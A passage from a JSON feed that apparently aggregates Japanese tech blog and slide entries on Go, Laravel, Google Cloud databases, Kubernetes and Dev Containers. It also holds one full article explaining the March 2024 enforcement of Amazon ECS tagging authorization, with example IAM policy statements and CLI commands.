Suiteってなに？","link":"https://qiita.com/m_pig/items/b2687df1da94edcaba89","contentSnippet":"記事を書くきっかけGoで自動テストを作成する際にstretchr/testifyを使用しているのですが、suiteをよく使います。最初はライブラリ特有のものと思いsuiteについて調べていたのですが、Test suiteという言葉があったことに驚きこの記事を書こうと思い...","isoDate":"2024-06-14T09:45:58.000Z","dateMiliSeconds":1718358358000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"あまり知られていないLaravelのコレクションメソッド #1: macro","link":"https://qiita.com/aminevg/items/e3a49c62fa805bef09bd","contentSnippet":"目次あまり知られていないLaravelのコレクションメソッド #1: macro （本記事）あまり知られていないLaravelのコレクションメソッド #2: concat背景Laravelのコレクション、使いこなしていますか？以下の記事を先程読んで面白いと...","isoDate":"2024-06-13T03:26:23.000Z","dateMiliSeconds":1718249183000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"API設計時に役立つAPIリファレンス一覧","link":"https://qiita.com/m_pig/items/a87248bcb0d783bd386b","contentSnippet":"この記事についてGolangでAPIを開発している際に参考にしたAPI referenceを自分のメモがてら書いていきます。google APIsgoogleのドキュメントでは画面右側から API exploreを使用して簡単にAPIを叩くことができるので実際のデ...","isoDate":"2024-06-10T00:56:48.000Z","dateMiliSeconds":1717981008000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"Google Cloud主催パートナー向けイベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」を話しました。","link":"https://zenn.dev/nnaka2992/articles/compare_vector_searches_on_google_clouds_rdb","contentSnippet":"2024年6月5日にGoogle Cloudがパートナー向けに開催したデータ関連の非公開イベントで「Google Cloud で利用できるRDBのベクトル検索を徹底解剖！」というLTを話しました。https://speakerdeck.com/nnaka2992/google-cloud-deli-yong-dekirurdbnobekutorujian-suo-woche-di-jie-pou非公開イベントのため録画がなかったり、LT枠だった関係で省略してしまった部分があったりしたためブログでより詳細な説明資料のようなものを書きました。 背景Google Cloudが提供する...","isoDate":"2024-06-09T22:00:00.000Z","dateMiliSeconds":1717970400000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud SQL for PostgreSQLのベクトル検索を試す","link":"https://zenn.dev/nnaka2992/articles/play_with_cloud_sql_vector_search","contentSnippet":"Google Cloud Next \'24でGoogle Cloudが提供するすべてのマネージドデータベースにベクトル検索の機能が追加されました。[1]今回はそのなかのCloud SQL for PostgreSQLにフォーカスしてベクトル検索機能を試します。 Cloud SQL for PostgreSQL インスタンススペックエディションEnterprisevCPU2RAM8GBストレージタイプSSDZoneasia-northeast1接続パブリックIPを有効化 必要な設定を行うデータベースを作成す...","isoDate":"2024-05-26T15:54:14.000Z","dateMiliSeconds":1716738854000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ人材になるために/becoming a security personnel","link":"https://speakerdeck.com/moz_sec_/becoming-a-security-personnel","contentSnippet":"2024年5月23日に行われたランチタイムトークで登壇した資料です。","isoDate":"2024-05-23T04:00:00.000Z","dateMiliSeconds":1716436800000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Kubernetes Code Contribution入門","link":"https://speakerdeck.com/bells17/kubernetes-code-contributionru-men","contentSnippet":"Kubernetes Novice Tokyo #32 で登壇したセッションの資料です。\\rhttps://k8s-novice-jp.connpass.com/event/317561/\\r\\r配信URL:\\rhttps://www.youtube.com/live/sRLG9ufaZ4M","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバーセキュリティの最新動向：脅威と対策","link":"https://speakerdeck.com/kyohmizu/saibasekiyuriteinozui-xin-dong-xiang-xie-wei-todui-ce","contentSnippet":"セミナー登壇資料です。2024/05/21\\rhttps://pages.securify.jp/event-seminar-20240521.html","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Oracle Dataabse 19cの検証環境が欲しいからProxmoxに環境構築する","link":"https://zenn.dev/nnaka2992/articles/install_oracle_19c_to_proxmox","contentSnippet":"概要300年ぶりぐらいに、ローカル環境(非Cloud環境)でホストしたOracle Databaseが欲くなったので、自宅にあるProxmoxへインストールします。 前提Proxmoxにダウンロード済みのOracle Linux 9のイメージを利用する。利用するOracle Databaseは19cとする。検証環境のため本番用途に適した設定ではない。 Proxmox VMを建ち上げる Oracle Database 19cのサーバ要件今回関係あるもののみ抜粋しています。OSOracle Linux 9およびRed Hat互換カーネル: 5.14.0-...","isoDate":"2024-05-19T14:18:18.000Z","dateMiliSeconds":1716128298000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"CloudSQL for PostgreSQLのベンチマークと比較して理解するAlloyDBの特徴","link":"https://zenn.dev/nnaka2992/articles/compare_alloydb_and_postgres","contentSnippet":"概要Google Cloudが提供するPostgreSQL互換データベースであるAlloyDBのパフォーマンスをトランザクション用途・分析用途の双方から検証する。今回の検証ではAlloyDBの上限を見定めるのではなく、CloudSQLと比べてどのようなパフォーマンスになるを目的とする。 TL;DR絞り込み条件がインデックスに限定されない場合、AlloyDBのパフォーマンスメリットが特に大きくなる。絞り込み条件がインデックスに限定され、かつデータサイズが小さい場合、CloudSQL for PostgreSQLのコストパフォーマンスが大きくなる。現将・将来のワークロード...","isoDate":"2024-05-17T15:16:13.000Z","dateMiliSeconds":1715958973000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.30] kube-proxy の nftables モード","link":"https://zenn.dev/toversus/articles/dcb888d73f0615","contentSnippet":"kube-proxyService へのトラフィックをプロキシするコンポーネントのデフォルト実装e.g.) Cluster IP への通信を Pod IP にリダイレクトするEndpointSlice, Service, Node などのオブジェクトの変更を検知して Service を介したトラフィックのルーティングを可能にするContainer Network Interface (CNI) vs kube-proxyCNI が Pod 間で通信できるように Pod IP の払い出しやルーティングをセットアップするPod は一時的なものかつ Pod ...","isoDate":"2024-05-16T23:43:33.000Z","dateMiliSeconds":1715903013000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Dev ContainersとTestcontainers","link":"https://speakerdeck.com/bells17/devcontainerstotestcontainers","contentSnippet":"TechFeed Experts Night#28 〜 コンテナ技術最前線 〜で登壇したセッションの資料です。\\rhttps://techfeed.io/events/techfeed-experts-night-28","isoDate":"2024-05-08T04:00:00.000Z","dateMiliSeconds":1715140800000,"authorName":"bells17","authorId":"bells17"},{"title":"[Kubernetes 1.30] Dynamic Resource Allocation の再構築","link":"https://zenn.dev/toversus/articles/5bbd68e507f28d","contentSnippet":"!Kubernetes 1.30 時点でアルファ機能のため、実装が大きく変わる可能性があります。[Kubernetes 1.27] Dynamic Resource Allocation のいまで紹介した Dynamic Resource Allocation (DRA) の内部的な仕組みに Kubernetes 1.30 で大きく変更が入ることになりました。内部的な仕組みの変更なので、ユーザー視点ではこれまでと利用方法は変わりません。ResourceClass に追加されたフィールドを有効にしないと新しい仕組みが使えないため、クラスタ管理者は対応が必要になります。世界的に AI...","isoDate":"2024-04-30T06:43:41.000Z","dateMiliSeconds":1714459421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"WireGuard Exporter と Grafana Alloy で VPN 通信量を可視化","link":"https://blog.1q77.com/2024/04/wireguard-exporter/","contentSnippet":"先日、家のラズパイに Grafana Alloy をセットアップしてメトリクス可視化の環境はできているので WireGuard での VPN 通信のメトリクスを可視化してみようかなと試してみました。","isoDate":"2024-04-28T12:57:31.000Z","dateMiliSeconds":1714309051000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"見て見ぬふりをしない、権限とWorkload Identity(Google Cloud)","link":"https://zenn.dev/kamos/articles/92a8125dc3adac","contentSnippet":"はじめにGoogle Cloudを使う際、最も頻繁に遭遇するエラーは「権限が足りない」というものでした。特に新しいプロジェクトを立ち上げ、CI/CDの構築に取り組む際にこのエラーに何度も直面し、時間を浪費してしまいました。この経験から、Google Cloudの権限管理を深く知ることが重要であると痛感しました。そこで、体系的にGoogle Cloudの権限管理を学び、その成果をこの記事でわかりやすく共有したいと思います。 この記事を読んでほしい人Google Cloudにおける権限、ロール、プリンシパル、ポリシーの意味と関係性を説明できない人Workload Ident...","isoDate":"2024-04-27T16:53:02.000Z","dateMiliSeconds":1714236782000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Dev Containerを使ってみよう","link":"https://zenn.dev/bells17/articles/devcontainer-2024","contentSnippet":"Dev Containerを使ってみようDev Containerを使う上で知っておくと良さげな情報のまとめ記事です前にRemote SSHでDev Containerの環境を構築する記事を書いたので、今回はDev Container全般の情報をまとめてみましたhttps://zenn.dev/bells17/articles/remote-ssh-devcontainer tl;drDev Containerを使うと開発環境をコンテナで構築できるよ(ランタイムとかツール類含めて！)docker composeだとアプリケーションを動作させる環境は作れるけどDev C...","isoDate":"2024-04-22T18:05:48.000Z","dateMiliSeconds":1713809148000,"authorName":"bells17","authorId":"bells17"},{"title":"[EKS] Amazon Linux 2023 への移行","link":"https://zenn.dev/toversus/articles/a4bbd2047bbba1","contentSnippet":"2024/2/29 に Amazon Linux 2023 が EKS で正式サポートされました。全てのリージョンの Karpenter Node、マネージドノードグループ、セルフマネージドノードグループで利用可能です。現在 EKS でサポート対象の 1.25 以降に加えて、延長サポートに入っている EKS 1.23 / 1.24 でも利用できます。Amazon Linux 2023 のサポートに関しては Amazon EKS-Optimized Amazon Linux 2023 AMIs Now Available のブログに詳細がまとまっています。 セキュリティ機能の強化Am...","isoDate":"2024-04-17T00:22:38.000Z","dateMiliSeconds":1713313358000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"コンテナセキュリティの基本と脅威への対策","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuriteinoji-ben-toxie-wei-henodui-ce","contentSnippet":"「Offers - 何から始める？脅威から考えるコンテナセキュリティのベストプラクティス」の登壇資料です。2024/04/16\\rhttps://offers.connpass.com/event/314412/","isoDate":"2024-04-16T04:00:00.000Z","dateMiliSeconds":1713240000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Grafana Alloy でメトリクス収集","link":"https://blog.1q77.com/2024/04/grafana-alloy/","contentSnippet":"Raspberry Pi を新しくしてからメトリクスの可視化を行っていなかったので Grafana Cloud で見れるようにセットアップしようと Grafana のサイトを見ていたら Alloy というものの存在を知ったので試してみる。","isoDate":"2024-04-15T15:16:09.000Z","dateMiliSeconds":1713194169000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Vimコマンドの考え方覚え方について","link":"https://qiita.com/m_pig/items/5701ac8e79f610f8e055","contentSnippet":"この記事についてVimを使用して普段開発しているのですが、先輩に勧められたテキストを読んでvimコマンドの考え方が今までと変わったので考え方について書いていきます。その他テキストから知って便利だったプラグインを紹介します。考え方コマンドの実行は主に暗記に頼...","isoDate":"2024-04-04T04:27:31.000Z","dateMiliSeconds":1712204851000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた","link":"https://nnaka2992.hatenablog.com/entry/zatu/20240323_pgunconf.md","contentSnippet":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた概要2024年3月23日に第46回 PostgreSQLアンカンファレンス@東京が開催されました。PostgreSQLアンカンファレンスは日本PostgreSQLユーザー会が主催するイベントでPostgreSQLユーザーはもちろん、PostgreSQLのコントリンビューターやコミッターも参加しているイベントです。その中でPostgreSQL メジャーコントリビューターであり、コミッターでもある@masahiko_sawadaさんが、PGConn 2024でMAKING POSTGRESQL HACKING MORE INCLUSIVEというセッションでPostgreSQLコミュニティーがどうすればより初心者にオープンになれるか？ という内容でディスカッションするそうです。そこに向けてアイデアはあるか？ 困ってることはないか？ という相談？ をされていました。経験豊富な方々は実践的な案を出していましたが、私はPostgreSQLにコードコントリビュートしたいけど何からすればいいのか分らないという状態だったのでこの機会に相談してみました。自分のレベル感Cはすこし読める。すこし書けるPostgreSQLのソースコードはsimple_query_execの関数をひととおり読んで、なんとなくどこで何しているか分かるPostgreSQLのメーリングリストはとりあえず入った何が分からなかったのか？そもそもPostgreSQLはメーリングリストとパッチの文化なのでGitHub/Labなどになれた身からするとよく分からないです。またGitHubで管理されているOSSでは良くあるgood first issueのようなものも存在しないため、新規参入者には難しいと感じていました。なにからすればいいのか？PGUnconfでは以下のようなアドバイスを受けました。チュートリアルをなぞってドキュメント通りに動かないものを修正する初心者向けコンテンツへの追記は初心者にしか出来ないので、是非おねがいしたいとのことでした既存のパッチで放置されているもの(Headでビルドできないようなもの)をアップデートするメーリングリストのディスカッションを眺めてネタを探す新規機能を試してバグをさがし、修正するCommitFestに参加するまとめ1のネタを探してみつつ、PostgreSQL17のリリースが近いので4に取りくんでみようと思います。","isoDate":"2024-03-31T14:30:29.000Z","dateMiliSeconds":1711895429000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"BigQuery の Object テーブルと Gemini-pro-vision リモートモデルを使って pdf を要約してみる","link":"https://zenn.dev/satohjohn/articles/0cc45efca800e3","contentSnippet":"概要pdf などの非構造化データを GCS に配置した際に BQ で分析するってどうすんねんというところをやってみる流れとしては以下を実施するpdf などを gcs に配置するBigQuery Connection の作成する必要な権限付与を行うBQ で Object テーブルを作成するBQ でリモートモデルを作成するObject テーブルを使って pdf の要約をする 必要なことBigQuery Connection API の有効化 手順 pdf などを GCS に配置するここは何も考えないで GCS に pdf を配置する例えば、今回...","isoDate":"2024-03-30T17:44:21.000Z","dateMiliSeconds":1711820661000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"生成AIアプリケーションにおけるRAGとデータベースの役割","link":"https://speakerdeck.com/shukob/sheng-cheng-aiahurikesiyonniokeruragtotetahesunoyi-ge","contentSnippet":"https://3-shake.connpass.com/event/311868/\\r3-SHAKE SRETTにて、生成AIのデータベースやストレージに関連した部分を発表。","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"オシャレな図を書くために意識していること","link":"https://speakerdeck.com/kojake_300/osiyarenatu-woshu-kutameniyi-shi-siteirukoto","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2024-03-29 SRETT9 Cloud SQLの可用性について","link":"https://speakerdeck.com/masasuzu/2024-03-29-srett9-cloudsqlnoke-yong-xing","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"4か月でSAA-C03に合格した話","link":"https://qiita.com/r4ynode/items/755ba932f2edcccaabaa","contentSnippet":"2024年4月1日から試験料金が値上げされますね。値上げ話から昨年受験したことを思い出したので感想を書いていこうと思います。はじめに2023年9月2日 SAA-C03に合格しました。資格勉強する以前は、クラウド聞いたことはあるけど何それ美味しいの？？状態でし...","isoDate":"2024-03-27T09:17:59.000Z","dateMiliSeconds":1711531079000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ビットコイン・ブロックチェーン入門","link":"https://speakerdeck.com/shukob/hitutokoinhurotukutienru-men","contentSnippet":"初学者の方向けにビットコイン・ブロックチェーン技術の全体像をお話ししました。","isoDate":"2024-03-22T04:00:00.000Z","dateMiliSeconds":1711080000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"ECSのタグ付け認可とアカウント単位のオプトアウトの廃止","link":"https://blog.masasuzu.net/entry/2024/03/20/121151","contentSnippet":"ECSのタグ付け認可とはアカウント単位のオプトアウトの廃止確認影響がある例対応まとめ関連リソースECSのタグ付け認可とはECS関連のリソース作成時にリソースタグを付けることができます。その際 ecs:tagResource の権限が必要となります。なお、リソースタグを設定しないECSリソース作成の際は権限不要です。この権限の有無のチェックをタグ付け認可と言います。具体的にECSリソースの作成のアクションは以下の通りです。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTaskタグ付け認可の仕組みは2023年4月18日に導入されました。しかしながら従来からECSリソースを作成する際にタグ付けしていたAWSアカウントに関しては影響があるため、アカウントレベルでタグ付け認可の機能を無効(オプトアウト)することができました。つまりアカウントレベルで無効にしていれば ecs:tagResource の権限がなくてもタグ付けをすることが可能でした。しかしながらアカウント単位のオプトアウト設定は2024年3月9日に廃止されます。アカウント単位のオプトアウトの廃止タグ付け認可におけるタイムラインは以下のとおりです2023年4月18日 タグ付け認可の導入とアカウント単位での有効化設定の導入2024年2月9日- 2月28日 新規アカウントおよび影響を受けないアカウントに関してデフォルトでタグ付け認可の有効化が行われる2024年2月29日 アカウント単位で有効にしている場合、無効に変更できなくなる2024年3月29日 すべてのアカウントでタグ付け認可が有効になり、アカウント単位での設定が不可能になる現時点(2024/03/20)であまり時間がありません。現在タグ付け認可に影響あるAWSアカウントに関しては、Personal Health Dashboadに以下のような通知が来ているはずです。▼ElasticContainerService security notification (クリックで展開)▼English follows Japanese | 英語のメッセージは日本語の後にございますお客様のアカウントにて過去 1 年以内に ecs:TagResource の許可無しに ECS リソースの作成時にタグを付けていることが判明したため、ご連絡差し上げます。Amazon ECS は、2023 年 4 月 18 日にリソース作成のタグ付け認証を導入しました [1]。新規および既存のお客様は、ECS Console または API の ECS アカウント設定ページを使用して、この新機能の使用をオプトインする必要があります。このセキュリティ制御により、ECS リソースの作成時にタグをつけることをユーザーに拒否または許可できます。2024 年 3 月 29 日以降もお客様の IAM プリンシパルが新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーを更新して ecs:TagResource アクションを明示的に許可することを強くお勧めします。2024 年 2 月 9 日以降、AWS コンソール の ECS アカウント設定ページにて tagResourceAuthorization アカウント設定を明示的に off に設定していないすべてのお客様のアカウントは、自動的にこの設定にオプトインされました。お客様の AWS アカウントは一時的に許可リストに載せているため、2024 年 3 月 29 日まではタグリソース認証の off の動作が継続されます。2024 年 3 月 8 日、現在オプトインしているアカウントが tagResourceAuthorization をオプトアウトする機能を削除し、タグをサポートするすべての ECS リソースの作成に際して ecs:TagResource IAM 権限の使用を強制するようにしました。最終的に 2024 年 3 月 29 日をもってお客様のアカウントを許可リストから削除し、tagResourceAuthorization を有効化します。呼び出し元のプリンシパルの IAM ポリシーに ecs:TagResource アクションを含めずにタグをつけて ECS リソースを作成しようとすると、「AccessDenied」メッセージが表示されます。この変更は CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, および RegisterTaskDefinition の API に影響を及ぼします。ecs:TagResource を使用しない拒否レスポンスの例以下は、ecs:CreateCluster アクションを付与している IAM ポリシーの一部です。ecs:TagResource アクションは含まれていません。tagResourceAuthorization アカウント設定がオンの場合、リクエスト例では以下の AccessDenied 例外が返されます。# IAM ポリシー“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# クラスター作成のリクエストaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# タグ付けの拒否されたレスポンスAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource action必要なアクション:IAM プリンシパルが 2024 年 3 月 29 日以降も新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーに次のステートメントを追加することを強くお勧めします。すべての ECS リソースの作成時にタグ付けを許可以下の説明に従って ecs:TagResource アクションを追加すると、ECS リソースの作成中にタグ付けが可能になります [2]。“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]単一の ECS リソースタイプ (ECS クラスタ) の作成時にタグ付けを許可条件ステートメント ecs:CreateAction を使用すると、タグ付けを特定の ECS API に制限できます。以下の例では、ECS CreateCluster API でのみタグ付けへのアクセスを許可します。タグ付きの ECS RunTask API へのリクエストは、拒否判定になります [2]。“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]タイムライン:2024 年 2 月 9 日（完了）- タグ付け認証はデフォルトで on になっています。これには、ホワイトリストに登録されているアカウントは含まれません。tagResourceAuthorization アカウント設定の on/off を切り替えることも可能であり、ポリシーへの準拠をテストいただけます。2024 年 3 月 8 日 - タグ付け認証を on にすると、off にすることはできなくなります。この日まではアカウント設定を切り替えることができますので、その間に IAM ポリシーをテストすることをお勧めします。2024 年 3 月 29 日 - すべての AWS アカウントでタグ付け認証が有効になります。アカウントレベルの設定は使用されなくなり、AWS コンソールの ECS アカウント設定ページから削除されます。ご質問やご不明点等ございましたら、AWS サポート [3] までお問い合わせください。[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support---We are contacting you because we identified that your account has tagged ECS resources upon creation, within the past year, without the ecs:TagResource permission. Amazon ECS introduced tagging authorization for resource creation on April 18, 2023 [1]. New and existing customers must opt-in to use this new feature by using the ECS Account Settings page in the ECS Console or API. This security control allows users to deny or allow tagging ECS resources when they are created. We strongly recommend you update your IAM policies to explicitly allow the ecs:TagResource action so that your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024.From February 9, 2024, all customer accounts which have not explicitly set the tagResourceAuthorization account setting to “off” in the ECS Account Settings page in the AWS Console were automatically opted into the setting. We have temporarily allow-listed your AWS account so you will continue to have the “off” behavior for tagResourceAuthorization until March 29, 2024.On March 8, 2024, we removed the ability for currently opted-in accounts to opt-out of tagging authorization and enforced the creation of all ECS resources that support tags to use the ecs:TagResource IAM permission.Finally on March 29, 2024, we will remove your account from the allow-list and activate tagResourceAuthorization. You will experience an \\"AccessDenied\\" message if you attempt to create tagged ECS resources without including the ecs:TagResource action in the IAM policy of the calling principal. This change will affect the following APIs: CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, and RegisterTaskDefinition.Example Deny Response without ecs:TagResourceThe following is part of an IAM policy that is granting the ecs:CreateCluster Action. It does not include the ecs:TagResource Action. When tagResourceAuthorization Account setting is on, the example request would return the AccessDeniedException below.# IAM Policy“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# Create Cluster Requestaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# Tagging Denied ResponseAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource actionRequired Action:To ensure your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024, we strongly recommend adding the following statement(s) to your IAM policies:Allow Tagging during creation for all ECS ResourcesAdding the ecs:TagResource Action as described below would Allow tagging during ECS resource creation [2].“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]Allow Tagging during creation for single ECS Resource Type (ECS Cluster)Using the Conditional statement ecs:CreateAction allow you to limit the tagging to a specific ECS API. The example below grants access to tagging only on the ECS create-cluster API. A request to the ECS API run-task with tags would result in a Deny decision [2].“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]Timeline:February 9, 2024 (Completed) - Tagging Authorization is “on” by default. This excludes your account which is allowlisted. The tagResourceAuthorization account setting can be turned on/off to help test your policy compliance.March 8, 2024 - Tagging Authorization can no longer be turned “off” once it is turned “on”. It is recommended that you test your IAM policies before this date while you are able to toggle the account setting.March 29, 2024 - Tagging Authorization will be turned on for all AWS accounts. The account level setting will no longer be used and will be removed from the ECS Account Settings page in the AWS Console.If you have any questions, please contact AWS Support [3].[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support通知が来ているアカウントは29日までに対応する必要があります。確認aws ecs list-account-settings --effective-settings --name tagResourceAuthorization を実行すると以下のような表示になると思います。ここがonであれば、すでにアカウント単位で有効になってるので影響がありません。(ただし、タグ付きのリソースを新規作成する際には権限が足りないとエラーになる可能性はあります)ここがoffになっている場合、タグ付け認可が無効になってるので3月29日以降影響を受ける可能性があります。% aws ecs list-account-settings --effective-settings --name tagResourceAuthorization{    \\"settings\\": [        {            \\"name\\": \\"tagResourceAuthorization\\",            \\"value\\": \\"on\\",            \\"principalArn\\": \\"arn:aws:iam::xxxxxxxxxxxx:root\\"        }    ]}影響がある例ユースケースにもよりますが、タグ付け認可に関連する操作は以下のようなものが考えられるかと思いますインフラ担当者によるECSリソース構築開発担当者(またはCI/CD)によるECSサービスのデプロイ前者に関しては、PowerUser相当の強い権限を付与されていることが多くここが問題になることはほとんどど無いかとは思います。後者の特にCI/CDによるデプロイに問題となることがありえます。一般的に非人間ユーザで目的が明確であれば、最小権限の原則に則り、 ecs:TagResource が付与されていない可能性があります。トライアンドエラーで権限を付与した場合、過去にうまく動いたためそのままの権限で使い続けている可能性もあります。その場合影響がある可能性あります。デプロイ時のタスク定義登録の際、タスク定義内に従来なかったtagsの記述を新規追加した際にResgisterTaskDefinitionでエラーになるという事例を私は経験しました。タスク定義にtagsがないときはタグ付け認可は実行されないのでそのまま成功していたため、ecs:TagResource が必要なことに気づいていませんでした。エラーとしては以下のような記述になるので、タグ付け認可の機能の存在を知っていて冷静に読み解けば、ecs:TagResource が足りていないことに気づけると思います。An error occurred (AccessDeniedException) when calling the RegisterTaskDefinition operation: User: arn:aws:sts::xxxx:assumed-role/deploy-github-actions/GitHubActions is not authorized to perform: ecs:TagResource on resource: arn:aws:ecs:ap-northeast-1:xxxx:task-definition/ecs-service because no identity-based policy allows the ecs:TagResource action対応まずECSサービスを利用しているIAM RoleとIAM Policyを洗い出します。その上でそれらが以下のアクションを許可している場合、ecs:TagResource を追加してあげます。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTask私の場合は、ECSサービスデプロイ用のポリシーに以下のStatementを追加しました。それぞれ適切な記述を足していただけたらと思います。この場合タスク定義を登録する際にタグ付け認可を通すような許可を追加しています。        {            \\"Action\\": \\"ecs:TagResource\\",            \\"Condition\\": {                \\"StringEquals\\": {                    \\"ecs:CreateAction\\": \\"RegisterTaskDefinition\\"                }            },            \\"Effect\\": \\"Allow\\",            \\"Resource\\": \\"arn:aws:ecs:ap-northeast-1:xxxxxx:task-definition/yyyyyyyyyyyyyyy:*\\",            \\"Sid\\": \\"RegisterTaskDefinitionWithTag\\"        },まとめタグ付け認可について説明しました。タグ付け認可は2024年3月29日に強制的に全アカウントで有効になります。時間が少ないですが、影響受ける可能性があるかどうかチェックしてハマらないようにしましょう。また、これまでタグ付けしてなかったリソースにタグ付けする際にタグ付け認可に引っかかる可能性があります。デプロイやリソース作成の際にnot authorized to perform: ecs:TagResource と言われたらこの記事を思い出していただけたらと思います。それでは良いECSライフを!関連リソースアカウント設定による Amazon ECS 機能へのアクセス - Amazon Elastic Container Service タグ付け認可リソース作成時にタグ付けするための許可を付与する - Amazon Elastic Container Service","isoDate":"2024-03-20T03:11:51.000Z","dateMiliSeconds":1710904311000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Skaffoldのスゴさを語る！","link":"https://zenn.dev/kojake_300/articles/11945f2047b22b","contentSnippet":"この記事は、2024/3/15に登壇したJagu\'e\'r クラウドネイティブ分科会　俺の考える最強のCI/CDのリマスターになります。 k8sアプリケーション開発の悩み突然ですが皆さん、k8sでアプリを動かす時にこんな悩み、イライラはありませんか？k8sで検証する時には必ず通る道だと思います。効率よく検証するにはどうしたものか、、Skaffoldはそんな悩みを解決してくれます\uD83D\uDE04 Skaffoldとは？ 概要Skaffold[1]は、コンテナベース及びKubernetesアプリケーションの継続的開発(Continuous Development = CD)を容易...","isoDate":"2024-03-18T11:24:43.000Z","dateMiliSeconds":1710761083000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Skaffoldを用いたGKEアプリケーションの CD（Continuous Development）","link":"https://speakerdeck.com/kojake_300/skaffoldwoyong-itagkeapurikesiyonno-cd-continuous-development","contentSnippet":"","isoDate":"2024-03-17T04:00:00.000Z","dateMiliSeconds":1710648000000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Tagpr で tag trigger の workflow が実行されなくてハマった話","link":"https://blog.1q77.com/2024/03/tagpr/","contentSnippet":"最近 tagpr という便利ツールの存在を知って試していたのですが、使い方が悪くてハマったのでメモ。tagpr とは作者さまの記事を参照ください。リリース用のpull requestを自動作成し、マージされたら自動でタグを打つtagpr","isoDate":"2024-03-15T00:00:00.000Z","dateMiliSeconds":1710460800000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Helm chart を GitHub Container Registry に host する","link":"https://blog.1q77.com/2024/03/helm-push-to-ghcr/","contentSnippet":"背景最近は書いたアプリを Kubernetes に deploy することも多い。その際に helm で簡単に deploy できるようになっていると便利ということで Helm chart を Git に入れておいても良いのだけれども、せっかくなら直接インストールできるようにしてしまいたい。そんな場合に使えるのが OCI 